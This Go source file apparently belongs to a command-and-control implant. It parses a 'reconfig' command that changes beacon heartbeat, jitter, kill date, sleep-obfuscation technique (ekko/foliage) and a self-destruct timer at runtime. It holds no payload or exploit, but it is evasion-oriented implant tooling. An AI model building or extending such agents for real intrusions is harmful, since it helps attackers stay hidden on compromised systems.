package modules

import (
	"fmt"
	"strings"
)

// reconfigSession 持有 Session 实例的引用（由 main.go 注入）。
// 使用接口避免循环依赖（modules 不能直接依赖 session 包）。
type ReconfigSession interface {
	Reconfig(field, value string) error
	CurrentConfig() string
	AgentID() string
}

var reconfigSession ReconfigSession

// SetSession 注入 Session 实例（由 main.go 调用）。
func SetSession(s ReconfigSession) {
	reconfigSession = s
}

// ReconfigModule 处理运行时配置修改命令。
// Usage:
//
//	reconfig show                        — 显示当前配置
//	reconfig set <field> <value>          — 修改配置
//
// 支持字段:
//
//	heartbeat  — 心跳间隔（秒）
//	jitter     — 心跳抖动（秒）
//	kill_date  — 自毁日期（YYYY-MM-DD）
//	technique  — 睡眠混淆技术（none/ekko/foliage）
//	selfdestruct — 自毁倒计时（秒，0=取消）
func ReconfigModule(args string) (string, string, int) {
	if reconfigSession == nil {
		return "", "reconfig: session not initialized", 1
	}

	fields := strings.Fields(args)
	if len(fields) < 1 {
		return "usage: reconfig <show|set> [field] [value]\n" +
			"  show                          — show current config\n" +
			"  set <field> <value>            — change config\n" +
			"Fields: heartbeat, jitter, kill_date, technique, selfdestruct", "", 1
	}

	switch fields[0] {
	case "show":
		cfg := reconfigSession.CurrentConfig()
		return cfg, "", 0

	case "set":
		if len(fields) < 3 {
			return "", "usage: reconfig set <field> <value>", 1
		}
		field := fields[1]
		value := strings.Join(fields[2:], " ")

		if err := reconfigSession.Reconfig(field, value); err != nil {
			return "", err.Error(), 1
		}
		return fmt.Sprintf("config updated: %s = %s", field, value), "", 0

	default:
		return fmt.Sprintf("unknown subcommand: %s (valid: show/set)", fields[0]), "", 1
	}
}
